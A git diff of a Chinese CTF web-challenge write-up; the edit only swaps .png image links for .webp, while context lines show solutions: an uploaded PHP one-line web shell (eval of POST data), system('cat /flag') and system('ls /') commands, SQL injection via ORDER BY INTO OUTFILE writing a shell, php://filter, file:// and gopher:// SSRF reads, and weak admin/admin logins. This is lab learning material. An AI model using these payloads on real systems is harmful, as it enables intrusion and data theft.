@@ -36,7 +36,7 @@ fetch("/flag.php", { method: "POST", headers: { "Content-Type": "application/x-w
 #### 解：
 其实刚点进来也是一头雾水，不过我们可以按照做web题的一般步骤来（我的一般步骤），先查看网页源码，按f12、ctrl+u和右击都没有用，所以网页源码肯定有猫腻，聪明的小伙伴肯定就知道了，我们可以直接通过浏览器的设置打开
 web开发者工具（或者在url栏最前面加上view-source:也可以）
-![](/images/20260507123857.png)
+![](/images/20260507123857.webp)
 然后我们访问/s3kret.php，就能看到php的源码了。
 ```php
 <?php   
@@ -98,7 +98,7 @@ Disallow: /hidden.php
 ```
 结果确实是一次又一次的回到这里，这时我们留意隐藏的页面是什么？？
 我们可以打开web开发者工具，在网络这一栏里面发现/hidden.php是302，被重定向了，我们只能看到“最终结果”，这时我们可以打开bp来抓/hidden.php的数据包
-![](/images/20260507145941.png)
+![](/images/20260507145941.webp)
 就能看到flag！！！
 #### 注：浏览器开发者工具与Burp Suite对302重定向的区别
 
@@ -121,8 +121,8 @@ Disallow: /hidden.php
 #### 解：
 ##### 1.第一关：骨钉大师——奥罗的考验
 先给骨钉大师打一点吉欧，直接连点是没用的，查看提示需要抓包，直接抓包
-![](/images/20260507201551.png)
-很明显，需要修改count的参数，为了确保能达到一定数量的吉欧，我们直接改成500，然后我们就得到了下一关的地址![](/images/20260507201741.png)
+![](/images/20260507201551.webp)
+很明显，需要修改count的参数，为了确保能达到一定数量的吉欧，我们直接改成500，然后我们就得到了下一关的地址![](/images/20260507201741.webp)
 #####  2.第二关：骨钉大师——马托的考验
 骨钉大师要我们和蘑菇先生拿回骨钉，直接提guding
 接着就和蘑菇先生对话，不过蘑菇先生说的话叽里咕噜的，直接查看提示
@@ -142,7 +142,7 @@ http://docker.qingcen.net:47787/talkToMushroom?shipin=mogubaozi
 POST:shipin=guding
 ```
 然后蘑菇先生告诉我们：这样吧，你用 DELETE 的方法把我身上的虫子(chongzi)都弄掉，我就把骨钉给你（这里需要了解DELETE是什么，其实它和POST，GET等一样也是一种请求方式），直接抓包来完成蘑菇先生的要求
-![](/images/20260507203307.png)
+![](/images/20260507203307.webp)
 放行后，再找蘑菇先生，他就会给出进入下一关的路径：/Level2_END
 ##### 3. 第三关：骨钉大师—— 席奥的考验
 席奥问：你的旋风斩(CycloneSlash)呢？使出来吧！
@@ -325,7 +325,7 @@ cipher=dW91dGlhKCdrbXQke0VIVX0kOS9oYm1nJyk7
 看到登录界面大致就两种思路：（1）sql注入（2）爆破账号密码
 可惜了，都不是（陪笑）！！！
 还是打开了页面源码看了看，果真里面是有线索的
-![](/images/20260508083405.png)
+![](/images/20260508083405.webp)
 原来他直接就把账号密码给我们了，于是我们就登录进来了。
 Doro给了我们一些提示：
 ```
@@ -523,7 +523,7 @@ drwxr-xr-x    1 root root 4096 Dec 11  2020 var
  ?>
 ```
 上传该1.mp3并抓包改成1.php
-![](/images/20260508203629.png)
+![](/images/20260508203629.webp)
 响应包里面显示上传成功，不过页面没有回显上传的路径（一开始我也是愣头青直接就POST传了cmd=system('cat /flag');结果一直显示错误,wuwuwu）
 这里需要查看页面源码，看上传路径是不是被隐藏了
 ```http
@@ -764,7 +764,7 @@ php://filter/string.rot13/resource=/flag
 #### 摘要：
 先查看页面源码找到接口index.php?proxy=和data-url="http://localhost/???" 再扫描目录得到flag.php看到源码，最后使用file://来读取根目录下的flag
 #### 解：
-![](/images/20260511172038.png)
+![](/images/20260511172038.webp)
 就给了这样一个界面，点击也只会播放音乐，页面没有任何其他的反应，还是老样子，查看页面源码
 ```java
 `<script>` 
@@ -1196,14 +1196,14 @@ gopher://ip:port/_后接TCP数据流(就是经过上面1,2步后得到的数据)
 ```
 直接使用弱口令，账号密码admin/admin，就成功登陆进来了
 我们找一下有没有可以上传文件的地方，在
-![](/images/20260511202744.png)
+![](/images/20260511202744.webp)
 经过测试直接传.php是不行的，所以我们可以传一个post_CMD.png
 ```php
 <?php
 @eval($_POST['shell']);
 ?>
 ```
-![](/images/20260511203546.png)
+![](/images/20260511203546.webp)
 放行就上传成功了，不过我们还要找上传的路径管理系统->文件管理器->uploads->cache->2026_05_11->2605110805493787.php(这就是我们上传的文件，因为后面又上传的日期)点击后，
 ```
 POST:shell=system('ls /');
@@ -1400,7 +1400,7 @@ $result = $mysqli->query($sql);
 "SELECT id, filename, upload_time  
         FROM uploads        ORDER BY $order"
 ```
-![](/images/20260513221042.png)
+![](/images/20260513221042.webp)
 接下来，利用 getFileList.php 的 order 参数进行 SQL 注入，将数据库中的一句话木马入到 Web 目录下的 PHP 文件中
 ```
 /getFileList.php?order=id%20INTO%20OUTFILE%20%27/var/www/html/shell.php%27
@@ -1445,7 +1445,7 @@ User-agent: *
 Allow: /find.php
 Disallow: /RPO/
 ```
-这里有两个关键信息：一是允许访问/find.php，二是禁止访问/RPO/目录。Disallow通常意味着该目录存在但不想被搜索引擎索引，反而引起了我们的注意。而Allow的/find.php则可能包含有用的提示信息。我们接着访问/find.php，结果是![](/images/20260513225344.png)
+这里有两个关键信息：一是允许访问/find.php，二是禁止访问/RPO/目录。Disallow通常意味着该目录存在但不想被搜索引擎索引，反而引起了我们的注意。而Allow的/find.php则可能包含有用的提示信息。我们接着访问/find.php，结果是![](/images/20260513225344.webp)
 令人生气的是，这个yes会随着鼠标的移动而移动，我们可以查看一下页面源码，发现里面有一个findpwd.js，点进去之后只得到一个提示信息："这里可没有，你想要的password，试着找找是不是在其他的find.php中？"这暗示密码隐藏在另一个路径下的findpwd.js中。结合robots.txt中提到的/RPO/目录，我们尝试访问/RPO/findpwd.js，成功获取到密码信息：
 ```
 console.log("Beep boop... 系统消息: yours password:@pwdisadmin");
@@ -1477,7 +1477,7 @@ HTTP请求头中，而没有对CRLF字符进行过滤，攻击者就可以通过
 # 24.眼熟的计算器
 #### 解：
 反编译jar包看源码
-![](/images/20260514204212.png)
+![](/images/20260514204212.webp)
 这里借用了大佬的脚本
 ```python
 import requests
